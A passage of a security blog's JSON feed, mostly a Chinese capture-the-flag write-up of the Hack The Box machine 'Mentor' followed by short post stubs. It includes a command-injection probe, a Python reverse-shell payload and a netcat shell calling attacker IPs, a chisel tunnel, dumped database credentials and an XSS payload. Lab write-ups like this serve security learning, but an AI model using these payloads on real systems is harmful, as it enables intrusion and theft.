&quot;python3&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91149 = STRING: &quot;/bin/sh&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91419 = STRING: &quot;/usr/libexec/upowerd&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91862 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91958 = STRING: &quot;/usr/sbin/apache2&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91959 = STRING: &quot;/usr/sbin/apache2&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.556 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.557 = STRING: &quot;-d -s&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.561 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.581 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.684 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.685 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.715 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.717 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.737 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.738 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.758 = STRING: &quot;-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: &quot;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.912 = STRING: &quot;--foreground&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.913 = STRING: &quot;/usr/bin/networkd-dispatcher --run-startup-triggers&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.914 = STRING: &quot;--no-debug&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.915 = STRING: &quot;-n -iNONE&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.927 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1200 = STRING: &quot;-f -P&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: &quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1221 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: &quot;-o -p -- \\\\u --noclear tty1 linux&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1243 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1254 = STRING: &quot;-k start&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: &quot;-H fd:// --containerd=/run/containerd/containerd.sock&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: &quot;/usr/local/bin/login.sh&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1742 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: &quot;-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1781 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1838 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1839 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1840 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1841 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1842 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1843 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1849 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: &quot;-namespace moby -id 556e8c834293dd86447407ed131913827ab286e6c16eb2629ef5567c3beec9ba -address /run/containerd/containerd.sock&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1889 = STRING: &quot;-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1958 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1971 = STRING: &quot;-namespace moby -id 9fe6db6386def9ee85a401e564be071bc55984fa0962d8748de5e8d6b1076a30 -address /run/containerd/containerd.sock&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.1993 = STRING: &quot;main.py&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.2007 = STRING: &quot;-c from multiprocessing.semaphore_tracker import main;main(4)&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: &quot;-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.2092 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.2110 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.26610 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.26614 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91129 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91137 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91143 = STRING: &quot;-c tar -c -f $(nc 10.10.14.89 9001 -e /bin/sh)/app_backkup.tar /app/ &amp;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91144 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91148 = STRING: &quot;-c import pty;pty.spawn(\\&quot;/bin/sh\\&quot;)&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91149 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91419 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91862 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91958 = STRING: &quot;-k start&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.91959 = STRING: &quot;-k start&quot;\nHOST-RESOURCES-MIB::hrSWRunParameters.92142 = &quot;&quot;\n</code></pre>\n<p>其中，这里有一个地方有些意思</p>\n<p><code>: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</code></p>\n<h3>Login as james</h3>\n<p>这里本来试着用 <code>admin@mentorquotes.htb</code> 结果发现不行，看了提示才知道是docs最上面还泄漏了james的邮箱（ <code>james@mentorquotes.htb</code> )</p>\n<p>使用james身份登录</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303156.png\" alt=\"Untitled\"></p>\n<p>然后将刚刚docs下的api接口的Authorization都替换为james的，users有返回：</p>\n<pre><code>{&quot;id&quot;:1,&quot;email&quot;:&quot;james@mentorquotes.htb&quot;,&quot;username&quot;:&quot;james&quot;},{&quot;id&quot;:2,&quot;email&quot;:&quot;svc@mentorquotes.htb&quot;,&quot;username&quot;:&quot;service_acc&quot;}\n\n</code></pre>\n<p>还有就是能用 <code>/quotes</code> 接口，往里新增之类的</p>\n<p>另外 <code>/admin</code>  也可以用啦</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303157.png\" alt=\"Untitled\"></p>\n<h2>SNMP - public</h2>\n<p>刚刚的命令是获取snmp下 <code>private</code> 的部分，还有 <code>public</code> 的部分尝试获取：</p>\n<pre><code class=\"language-bash\">~ snmpbulkwalk -v2c -c public 10.10.11.193                                                                                                                                       0 [11:48:10]\nSNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\nSNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10\nDISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6269914) 17:24:59.14\nSNMPv2-MIB::sysContact.0 = STRING: Me &lt;admin@mentorquotes.htb&gt;\nSNMPv2-MIB::sysName.0 = STRING: mentor\nSNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay\nSNMPv2-MIB::sysServices.0 = INTEGER: 72\nSNMPv2-MIB::sysORLastChange.0 = Timeticks: (6) 0:00:00.06\nSNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance\nSNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance\nSNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance\nSNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB\nSNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup\nSNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB\nSNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB\nSNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip\nSNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance\nSNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB\nSNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.\nSNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.\nSNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.\nSNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities\nSNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.\nSNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations\nSNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations\nSNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations\nSNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.\nSNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.\n\nHOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6273398) 17:25:33.98\nHOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-3-15,3:56:37.0,+0:0\nHOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216\nHOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: &quot;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0\n&quot;\nHOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0\nHOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 235\nHOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)\n</code></pre>\n<h2>/admin</h2>\n<p>可以看到，现在用james的身份，/admin 返回</p>\n<pre><code>{&quot;admin_funcs&quot;:{&quot;check db connection&quot;:&quot;/check&quot;,&quot;backup the application&quot;:&quot;/backup&quot;}}\n</code></pre>\n<p>测试 /admin/check， 返回： {&quot;details&quot;:&quot;Not implemented yet!&quot;}</p>\n<p>然后测试 /admin/backup，根据response一点点构造</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303158.png\" alt=\"Untitled\"></p>\n<h3>command injection</h3>\n<p>从API生成backup，考虑到有可能将传入的path作为command的参数，然后执行命令</p>\n<p>测试如下命令：</p>\n<pre><code>{\n\t\t&quot;path&quot;: &quot;test; wget  http://10.10.14.32 ;&quot;\n}\n</code></pre>\n<p>本地收到</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303159.png\" alt=\"Untitled\"></p>\n<h2>User flag</h2>\n<p>参考：<a href=\"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 下的reverse shell cheat sheet</p>\n<p>用bash没有成功，用python的（因为网站基于python的web框架）</p>\n<pre><code>{\n\t\t&quot;path&quot;: &quot;test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.10.14.32\\&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);' &quot;\n}\n</code></pre>\n<p>然后是upgrade shell  <code>^Z</code>  后，输入</p>\n<pre><code>stty raw -echo; fg\n</code></pre>\n<p>到用户 $HOME目录下，获取user.flag</p>\n<h2>root flag</h2>\n<p>在 <code>/app</code> 目录下查看Dockerfile，当前网站是在容器内运行。</p>\n<p>Dockerfile的内容如下：</p>\n<pre><code class=\"language-docker\">FROM python:3.6.9-alpine\n\nRUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev\n\nWORKDIR /app\nENV HOME /home/svc\nENV PATH /home/svc/.local/bin:${PATH}\nRUN python -m pip install --upgrade pip --user svc\nCOPY requirements.txt requirements.txt\nRUN pip install -r requirements.txt\nRUN pip install pydantic[email] pyjwt\nEXPOSE 8000\nCOPY . .\nCMD [&quot;python3&quot;, &quot;-m&quot;, &quot;uvicorn&quot;, &quot;app.main:app&quot;, &quot;--reload&quot;, &quot;--workers&quot;, &quot;100&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot; ,&quot;8000&quot;]\n</code></pre>\n<p>在 <code>/app/app</code> 下，有有关这个网站的全部py代码，config.py是空，但是db.py有（地址是docker的地址）</p>\n<pre><code class=\"language-docker\">DATABASE_URL = os.getenv(&quot;DATABASE_URL&quot;, &quot;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&quot;)\n</code></pre>\n<p>想到之前在推看到的文章： <a href=\"https://dmesg.app/ufw-vs-docker.html\">https://dmesg.app/ufw-vs-docker.html</a></p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031510.png\" alt=\"Untitled\"></p>\n<p>我对这块不太熟悉，所以还是看了大佬的writeup的思路过程。</p>\n<p>用<a href=\"https://github.com/jpillora/chisel\">https://github.com/jpillora/chisel</a> 的开源</p>\n<p>攻击机：</p>\n<pre><code class=\"language-docker\">./chisel_1.8.1_linux_amd64 server -p 8000 --reverse\n</code></pre>\n<p>container：</p>\n<p>用 Chisel 工具建立一个反向隧道（8000端口），将本地客户端的 5432 端口映射到远程服务器 172.22.0.1 的 5432 端口。</p>\n<pre><code class=\"language-docker\">./chisel_1.8.1_linux_amd64 client 10.10.14.32:8000 R:5432:172.22.0.1:5432\n</code></pre>\n<h3>connect to database</h3>\n<p>命令</p>\n<pre><code class=\"language-docker\">psql -h 127.0.0.1 -p 5432 -U postgres\n</code></pre>\n<p>密码也是postgres。输入 <code>\\list</code> 查看全部database，发现 mentorquotes_db</p>\n<ol>\n<li><code>\\connect mentorquotes_db</code>  连接到数据库</li>\n<li><code>\\dt</code></li>\n</ol>\n<pre><code class=\"language-docker\">mentorquotes_db=# \\dt\n          List of relations\n Schema |   Name   | Type  |  Owner   \n--------+----------+-------+----------\n public | cmd_exec | table | postgres\n public | quotes   | table | postgres\n public | users    | table | postgres \n</code></pre>\n<ol>\n<li><code>select * from xxx</code></li>\n</ol>\n<pre><code class=\"language-docker\">mentorquotes_db=# select * from users;\nid |         email          |  username   |             password             \n----+------------------------+-------------+----------------------------------\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\n  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8\n</code></pre>\n<p>还有一种方法是直接该models，加个password的字段。这样访问api的/users会返回密码</p>\n<p>密码是 ： svc@mentorquotes.htb  /  <code>123meunomeeivani</code></p>\n<h3>提权</h3>\n<p>查看 <code>/etc/snmp</code> 目录，用以下命令去查看相关的snmp配置（去除掉注释）</p>\n<pre><code class=\"language-docker\">/etc/snmp$ cat snmpd.conf | grep -v &quot;^#&quot; | grep .\n</code></pre>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031511.png\" alt=\"Untitled\"></p>\n<p>密码是： <code>SuperSecurePassword123__</code></p>\n<p>登录后 <code>sudo -l</code> 查看权限</p>\n<pre><code class=\"language-docker\">sudo /bin/sh\n</code></pre>\n<h2>Reference</h2>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></li>\n<li><a href=\"https://www.daehee.com/werkzeug-console-pin-exploit/\">https://www.daehee.com/werkzeug-console-pin-exploit/</a></li>\n<li><a href=\"https://0xdf.gitlab.io/2023/03/11/htb-mentor.html\">https://0xdf.gitlab.io/2023/03/11/htb-mentor.html</a></li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbmentor",
+            "title": "HTB:Mentor",
+            "date_modified": "2023-03-15T22:11:44.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>输入错误的用户名和密码,发现提示权限失败的message是通过url传输的,构造payload引起alert的弹窗</p>\n<p>payload : <a href=\"http://178.62.5.61:31279/login?message=%3Cimg%20src=1%20onerror=alert(123)%3E\"><code>http://178.62.5.61:31279/login?message=&lt;img src=1 onerror=alert(123)&gt;</code></a></p>\n<p>但是还是需要登陆的,在登陆页面输入wildcards的'<em>'(用户名和密码均是).因为没有前面的过滤,直接把</em>传递到后台,所以就能登陆进去了.</p>\n<p>进行code review.发现请求了一个/search 的api,如果成功,就显示search后的结果(以table的方式)</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbphonebook-or-writeup",
+            "title": "[HTB]phonebook | writeup",
+            "date_modified": "2021-12-15T17:00:03.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>HTB：Vessel</h1>\n<p>关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstall</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbvessel",
+            "title": "HTB:Vessel",
+            "date_modified": "2023-04-02T20:54:57.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>笔记来源：</p>\n<ul>\n<li>[<a href=\"https://is4b3lla3.github.io/2020/06/27/Java\">https://is4b3lla3.github.io/2020/06/27/Java</a> RMI学习/#远程方法调用](<a href=\"https://is4b3lla3.github.io/2\">https://is4b3lla3.github.io/2</a></li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/java-rmiremote-method-invocation",
+            "title": "java RMI（Remote Method Invocation）",
+            "date_modified": "2022-04-15T23:38:44.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>重新捡起java诶~</p>\n<h2>基础概念</h2>\n<h3>J2EE &amp; JAVA EE &amp; jakarta EE</h3>\n<p>在此之前要知道 ：</p>\n<blockquote>\n<p>Ever heard of Java EE? How abou</p>\n</blockquote>\n",
+            "url": "https://1dayluo.github.io/posts/history/java-xue-xi-bi-ji-servlet",
+            "title": "Java学习笔记: Servlet",
+            "date_modified": "2023-06-08T20:05:34.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>笔记中英文混杂,问就是懒得翻译.学习笔记都是二次吸收,原始文章见Resource&amp;Reference处. 笔记只是留给自己学习反复查阅和理解的......尽可能写的对自己来说全面一些.</p>\n<p>~~其实学了</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/javascript-prototype-pollution-xue-xi-bi-ji",
+            "title": "Javascript Prototype Pollution 学习笔记",
+            "date_modified": "2022-05-26T20:45:41.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<blockquote>\n<p>这是一个应付技术分享会的文稿<br>\n写在开头：<br>\n技术分享会写的稿子，文字写的很认真。PPT就。。。应付吧，计划用reveal-md生成PPT （反正第一天感觉好多都好水)  据我认真观察，讲</p>\n</blockquote>\n",
+            "url": "https://1dayluo.github.io/posts/history/ji-zhu-fen-xiang-hui-wo-dui-yu-flask-jin-qi-li-jie-de-yi-ge-gao-zi",
+            "title": "对于Flask的个人理解及安全相关",
+            "date_modified": "2020-08-17T22:56:27.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>Double_ SQL_Injection/#0x01-双查询</h1>\n<p>原文链接：[Double SQL Injection(双查询注入) | Mochazz's blog](<a href=\"https://moc\">https://moc</a></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/ji-zhu-yue-du-shuang-cha-xun-yuan-li",
+            "title": "[技术阅读]双查询原理",
+            "date_modified": "2021-07-28T13:39:07.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "",
+            "url": "https://1dayluo.github.io/posts/history/ji-zhu-yue-du-web-huan-cun-tou-du",
+            "title": "[技术阅读]web缓存投毒",
+            "date_modified": "2021-07-28T13:39:59.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>GitHub for Bug Bounty Hunters-edoverflow</h1>\n<p>原文链接：[GitHub for Bug Bounty Hunters](<a href=\"https://edoverflo\">https://edoverflo</a></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/ji-zhu-yue-du-yong-github-lai-shi-xian-lou-dong-shang-jin-xi-ren",
+            "title": "[技术阅读]用github来实现漏洞赏金猎人",
+            "date_modified": "2021-07-28T13:37:32.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>场景总结</h2>\n<p>首先要明白，一个jwt是由三部分组成的：header，payload，signature。三个部分用 <code>.</code> 连接，用base64编码且格式要求去掉末尾的 <code>=</code></p>\n<p>其他额外需要知</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/jwt-crack-zong-jie",
+            "title": "JWT Crack总结 （一）",
+            "date_modified": "2022-11-24T23:06:39.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>关键词:MD5, SHA-1,Length Extension Attack</p>\n<h2>Outline</h2>\n<p>网站通常会hash对应的secret以防止被篡改。而Length extension atta</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/length-extension-attack",
+            "title": "Length Extension Attack",
+            "date_modified": "2023-05-23T05:16:32.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>《zseano's methodogy》学习笔记</h1>\n<p>一些图片没有上传,本地和notion好好的,上传上来格式有些emmm(看阅读时间要35min也能够知道完整的文章目前博客显示不完整),完整笔记可</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/lesslesszseanos-methodogygreatergreater-xue-xi-bi-ji",
+            "title": "《zseano's methodogy》学习笔记",
+            "date_modified": "2022-02-01T22:25:01.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>为什么需要TLS</h2>\n<p>前提：每个线程都有TLS<br>\n如果我们要在多线程中对全局变量(<code>Global Variable</code>)进行操作，除了保护多个线程对该变量内存读写不会有影响（加锁)，同时也要</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/li-jie-tls",
+            "title": "理解TLS",
+            "date_modified": "2020-06-30T15:52:47.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>无聊水篇oao<br>\n昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2-wang-pan-xia-zai-dai-ti-xun-lei",
+            "title": "Linux篇:配置你的aria2 - (网盘下载 代替迅雷)",
+            "date_modified": "2022-06-06T11:01:08.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>无聊水篇oao<br>\n昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,先</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2",
+            "title": "Linux篇:配置你的aria2",
+            "date_modified": "2022-06-06T11:01:08.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>反序列化</h1>\n<p>概念整理搬运工，都是看各类网上文章整理好久+自己的学习理解才发布的博文ovo 参考见文末，如果有落下欢迎指正。更新最新版见在个人notion，~~不懒的话有更新会及时同步到blog的2</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/php-fan-xu-lie-hua-bi-ji",
+            "title": "PHP反序列化笔记",
+            "date_modified": "2022-12-21T15:39:37.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p><s>非常的氵</s><br>\n之前链接一直很成功，在一次pacman -Syu的滚动更新后，发现链接htb的时候一直在报错：</p>\n<pre><code>VERIFY ERROR: depth=0, error=CA signat</code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/san-openvpn-lian-jie-htb-bao-cuo-xiu-fu-verfiy-error",
+            "title": "氵：openvpn连接htb报错修复：verfiy error",
+            "date_modified": "2023-01-20T17:05:37.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h2>关于sddm</h2>\n<h3>sddm主题</h3>\n<ol>\n<li>去arch aur官网，搜索sddm-theme即可，然后列出来的可以去github（<br>\nGit Clone URL什么的）看一下样式。</li>\n</ol>\n",
+            "url": "https://1dayluo.github.io/posts/history/sddm-and-i3-mei-hua-and-za-tan",
+            "title": "sddm & i3 美化 & 杂谈",
+            "date_modified": "2022-11-19T23:56:49.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>SSRF(Server-Side Request Forgery)</h1>\n<aside>\n💡 Make sure the request comes from the remote server a",
+            "url": "https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrf-wo-de-xue-xi-bi-ji",
+            "title": "深入浅出SSRF（一） ： 我的学习笔记",
+            "date_modified": "2022-11-30T23:17:15.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>困困更blog……<br>\n之前拿着本来要发blog的文章去“换”了一个会员...其实我不太喜欢闭源小圈子分享（虽然能换积分/社区认同），我还是喜欢自己博客发，要么不发....小透明的坚持，等找工作/需要交</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrfer-wo-de-xue-xi-bi-ji",
+            "title": "深入浅出SSRF（二）：我的学习笔记",
+            "date_modified": "2022-11-30T23:22:46.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
